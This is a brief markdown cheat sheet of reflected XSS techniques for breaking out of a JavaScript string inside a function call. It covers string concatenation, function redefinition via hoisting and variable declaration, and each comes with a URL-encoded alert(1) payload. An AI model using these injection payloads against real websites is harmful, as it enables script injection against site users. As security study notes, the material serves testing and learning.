# XSS-Notes
XSS Scenarios

```
<script>
    leo.write('test','reflection_here')
</script>
```

Exploitable scenarios

```
vulnerableFunction('test', 'INJECTION');
```
```
//param='-alert(1)-'
vulnerableFunction('test', ''-alert(1)-''); 
```

Function injection

```
vulnerableFunction('test', ''-alert(1)-''); 

function vulnerableFunction(a,b){
    return 1
};
```
```
//Payload
param='-alert(1)-'')%3b+function+vulnerableFunction(a,b){return+1}%3b
```

```
vulnerableFunction('test', 'test'); 

function vulnerableFunction(a,b){
    return 1
};

alert(1)
```

```
//Payload
param=test')%3bfunction+vulnerableFunction(a,b){return+1}%3balert(1)
```

Variable injection

```
function myFunction(a,b){
    return 1
};
myFunction(a, 'test'); 
var a = 1;
alert(1);
```

```
//Payload
param=test')%3b+var+a+%3d+1%3b+alert(1)%3b
```


